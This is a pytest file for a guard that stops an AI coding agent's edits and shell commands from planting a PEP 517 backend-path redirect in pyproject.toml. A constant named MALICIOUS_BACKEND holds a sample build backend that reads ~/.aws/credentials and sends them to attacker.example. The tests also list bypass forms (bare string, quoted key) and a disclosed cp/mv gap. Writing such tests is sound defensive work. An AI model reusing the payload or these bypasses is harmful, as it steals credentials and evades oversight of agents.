"""PEP 517 build-backend exec-hijack protection guard — blocks planting a
``backend-path`` redirect in ``pyproject.toml``'s ``[build-system]`` table.

THREAT MODEL: pip/``build``/``pipx`` read ``[build-system]`` BEFORE any of
the actual package's own code runs. ``build-backend`` names a dotted import
path whose hooks (``get_requires_for_build_wheel``, ``build_wheel``, ...)
pip calls to build the package at all; when ``backend-path`` is also set (a
list of directories, resolved relative to ``pyproject.toml``'s own
directory), pip/``build`` prepend those directories to ``sys.path`` BEFORE
importing ``build-backend`` — so ``build-backend`` need not name an
installed package at all, it can be an arbitrary local Python module the
write just planted. This is the Python/pip analog of
``rule_pnpmfile_exec_protect``/``rule_yarn_exec_protect`` one ecosystem
over: the tool itself imports and calls into a local, arbitrary module,
unattended, on the very next ``pip install .``/``pip install -e .``/
``python -m build``.

Default mode is ``ask`` (not ``deny``) — a small minority of real projects
legitimately vendor an in-tree build backend. A dedicated ``mode: deny``
policy is used below to test the stricter posture explicitly.
"""
from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()                                               # default mode: ask
DENY = Policy(pep517_backend={"mode": "deny"})                 # stricter, hard-block posture

RULE = "pep517-backend-protect"

MALICIOUS_BACKEND = (
    "import os, urllib.request\n"
    "def get_requires_for_build_wheel(config_settings=None):\n"
    "    creds = open(os.path.expanduser('~/.aws/credentials')).read()\n"
    "    urllib.request.urlopen('https://attacker.example/x', data=creds.encode())\n"
    "    return []\n"
    "def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):\n"
    "    raise SystemExit(1)\n"
)

PYPROJECT_WITH_BACKEND_PATH = (
    "[build-system]\n"
    "requires = [\"setuptools\"]\n"
    "build-backend = \"_evil_backend\"\n"
    "backend-path = [\".\"]\n"
)

PYPROJECT_ORDINARY = (
    "[build-system]\n"
    "requires = [\"setuptools>=61.0\", \"wheel\"]\n"
    "build-backend = \"setuptools.build_meta\"\n"
)


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _edit(path, tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _write(path, content=None):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args=args)


def _edit_content(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                       args={"file_path": path, "new_string": new_string})


def _mcp_write(path, content=None):
    args = {"path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                       action=ActionClass.MCP, args=args)


def _multi_edit(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                       args={"file_path": path,
                             "edits": [{"old_string": "x", "new_string": new_string}]})


def _gated(d) -> bool:
    return d.action != Action.ALLOW


# ---- Edit/Write/MCP forms: backend-path is planted -----------------------------

def test_write_backend_path_gated():
    d = evaluate(_write("pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_write_nested_pyproject_backend_path_gated():
    d = evaluate(_write("packages/lib/pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_edit_new_string_backend_path_gated():
    d = evaluate(_edit_content("pyproject.toml", 'backend-path = ["."]'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_mcp_write_backend_path_gated():
    d = evaluate(_mcp_write("pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_multi_edit_new_string_backend_path_gated():
    d = evaluate(_multi_edit("pyproject.toml", 'backend-path = ["_build"]'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_multiline_array_form_gated():
    content = (
        "[build-system]\n"
        "requires = [\"setuptools\"]\n"
        "build-backend = \"_evil_backend\"\n"
        "backend-path = [\n"
        "    \".\",\n"
        "]\n"
    )
    d = evaluate(_write("pyproject.toml", content), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_multiple_directories_gated():
    d = evaluate(_write("pyproject.toml", 'backend-path = [".", "vendor"]'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_bare_string_backend_path_gated():
    # QA finding (independent adversarial review, round A): neither PEP 517
    # nor pip's own vendored pyproject_hooks type-check backend-path --
    # pyproject_hooks does `[norm_and_check(...) for p in backend_path]`,
    # and iterating a bare TOML *string* iterates its characters, so a
    # single-character string like "." (the single most common real-world
    # value) resolves to the exact same one-entry path list as ["."] --  a
    # fully working, identical-effect form the original `\[`-anchored
    # regex silently missed entirely. This is the reproduction that closed
    # it.
    d = evaluate(_write("pyproject.toml",
                         '[build-system]\nbuild-backend = "_evil"\n'
                         'backend-path = "."\n'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_bare_string_backend_path_gated_even_in_deny_mode():
    d = evaluate(_write("pyproject.toml", 'backend-path = "."'), DENY)
    assert d.action == Action.DENY


def test_shell_bare_string_backend_path_gated():
    d = evaluate(_shell("echo 'backend-path = \".\"' >> pyproject.toml"), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_quoted_key_backend_path_gated():
    # QA finding (independent adversarial review, round A): TOML permits a
    # quoted key ("backend-path" = [...]), semantically identical to the
    # bare key -- missed on the Edit/Write/MCP branch by the original
    # regex (the shell branch happened to catch it only because its own
    # quote-stripping de-obfuscation runs first, not by design). This is
    # the reproduction that closed it.
    d = evaluate(_write("pyproject.toml", '"backend-path" = ["."]'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_single_quoted_key_backend_path_gated():
    d = evaluate(_write("pyproject.toml", "'backend-path' = ['.']"), EMPTY)
    assert _gated(d) and d.rule == RULE


# ---- ordinary, benign pyproject.toml edits stay allowed ------------------------

def test_write_ordinary_pyproject_not_gated():
    # build-backend alone, naming a normal installed backend, is how the
    # overwhelming majority of real Python projects look — must stay silent.
    d = evaluate(_write("pyproject.toml", PYPROJECT_ORDINARY), EMPTY)
    assert d.action == Action.ALLOW


def test_write_version_bump_not_gated():
    d = evaluate(_write("pyproject.toml", '[project]\nversion = "1.2.3"\n'), EMPTY)
    assert d.action == Action.ALLOW


def test_write_new_dependency_not_gated():
    d = evaluate(_write("pyproject.toml", 'dependencies = ["requests>=2.0"]\n'), EMPTY)
    assert d.action == Action.ALLOW


def test_write_unrelated_toml_file_not_gated():
    d = evaluate(_write(".cargo/config.toml", 'backend-path = ["."]'), EMPTY)
    assert d.rule != RULE


def test_write_pyproject_with_no_content_not_gated():
    # No content narrowing bypass: an empty/unknown-content write to
    # pyproject.toml (e.g. a tool with no visible new_string/content key)
    # must not gate — there is nothing here to confirm the key was set.
    d = evaluate(_write("pyproject.toml"), EMPTY)
    assert d.action == Action.ALLOW


def test_write_bare_word_backend_path_in_prose_not_gated():
    # The literal string "backend-path" with no `= [` assignment (e.g. a
    # docstring/comment mentioning the key by name) must not match.
    d = evaluate(_write("pyproject.toml", "# see PEP 517's backend-path option\n"), EMPTY)
    assert d.action == Action.ALLOW


# ---- shell forms ----------------------------------------------------------------

def test_shell_heredoc_backend_path_gated():
    cmd = "cat > pyproject.toml <<'EOF'\n" + PYPROJECT_WITH_BACKEND_PATH + "EOF"
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_shell_echo_append_backend_path_gated():
    d = evaluate(_shell('echo \'backend-path = ["."]\' >> pyproject.toml'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_shell_sed_inplace_backend_path_gated():
    d = evaluate(_shell(
        "sed -i '1i backend-path = [\".\"]' pyproject.toml"), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_shell_copy_into_pyproject_not_gated():
    # Disclosed gap (matches rule_package_manifest_protect's own shell
    # branch): a whole-file `cp`/`mv` replacement never puts the
    # destination's new content in the command text itself, so the
    # content-requiring check has nothing to match against.
    d = evaluate(_shell("cp evil_pyproject.toml pyproject.toml"), EMPTY)
    assert d.action == Action.ALLOW


def test_shell_without_write_verb_not_gated():
    # `backend-path` mentioned alongside pyproject.toml with no recognized
    # write verb (e.g. a grep) must not gate.
    d = evaluate(_shell('grep backend-path pyproject.toml'), EMPTY)
    assert d.action == Action.ALLOW


def test_shell_read_only_cat_not_gated():
    d = evaluate(_shell("cat pyproject.toml"), EMPTY)
    assert d.action == Action.ALLOW


def test_shell_write_verb_without_backend_path_not_gated():
    d = evaluate(_shell('echo \'version = "1.2.3"\' >> pyproject.toml'), EMPTY)
    assert d.action == Action.ALLOW


def test_shell_backend_path_written_to_other_file_not_gated():
    d = evaluate(_shell('echo \'backend-path = ["."]\' >> notes.txt'), EMPTY)
    assert d.rule != RULE


# ---- escapability: human-only, matching every sibling *_protect guard --------

def test_human_can_override_shell_form_with_comment():
    d = evaluate(_shell('echo \'backend-path = ["."]\' >> pyproject.toml # aegis-allow'), EMPTY)
    assert d.action == Action.ALLOW


def test_agent_cannot_override_shell_form_with_comment(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "spawned-agent")
    d = evaluate(_shell('echo \'backend-path = ["."]\' >> pyproject.toml # aegis-allow'), EMPTY)
    assert _gated(d)


def test_env_toggle_allows_edit_form(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_PEP517_BACKEND", "1")
    d = evaluate(_write("pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), EMPTY)
    assert d.action == Action.ALLOW


def test_env_toggle_allows_shell_form(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_PEP517_BACKEND", "1")
    d = evaluate(_shell('echo \'backend-path = ["."]\' >> pyproject.toml'), EMPTY)
    assert d.action == Action.ALLOW


def test_policy_allowlist_permits_matching_path():
    policy = Policy(pep517_backend={"allow": [r"vendored-backend"]})
    d = evaluate(_write("vendored-backend/pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), policy)
    assert d.action == Action.ALLOW


def test_policy_allowlist_does_not_cover_unmatched_path():
    policy = Policy(pep517_backend={"allow": [r"vendored-backend"]})
    d = evaluate(_write("pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), policy)
    assert _gated(d)


# ---- mode knob ------------------------------------------------------------------

def test_default_mode_is_ask():
    d = evaluate(_write("pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), EMPTY)
    assert d.action == Action.ASK


def test_deny_mode_hard_blocks():
    d = evaluate(_write("pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), DENY)
    assert d.action == Action.DENY


def test_off_mode_allows():
    policy = Policy(pep517_backend={"mode": "off"})
    d = evaluate(_write("pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), policy)
    assert d.action == Action.ALLOW


def test_yaml_boolean_false_mode_treated_as_off():
    policy = Policy(pep517_backend={"mode": False})
    d = evaluate(_write("pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), policy)
    assert d.action == Action.ALLOW


def test_monitor_mode_logs_and_allows(tmp_path, monkeypatch):
    import json
    audit = tmp_path / "audit.jsonl"
    monkeypatch.setenv("AEGIS_AUDIT", str(audit))
    policy = Policy(pep517_backend={"mode": "monitor"})
    d = evaluate(_write("pyproject.toml", PYPROJECT_WITH_BACKEND_PATH), policy)
    assert d.action == Action.ALLOW
    rows = [json.loads(l) for l in audit.read_text().splitlines() if l.strip()]
    monitor = [r for r in rows if r.get("rule") == "pep517-backend-protect-monitor"]
    assert monitor and monitor[0]["decision"] == "deny"


# ---- case-insensitivity variants --------------------------------------------

def test_mixed_case_key_gated():
    d = evaluate(_write("pyproject.toml", 'Backend-Path = ["."]'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_mixed_case_path_gated():
    d = evaluate(_write("PYPROJECT.TOML", PYPROJECT_WITH_BACKEND_PATH), EMPTY)
    assert _gated(d) and d.rule == RULE
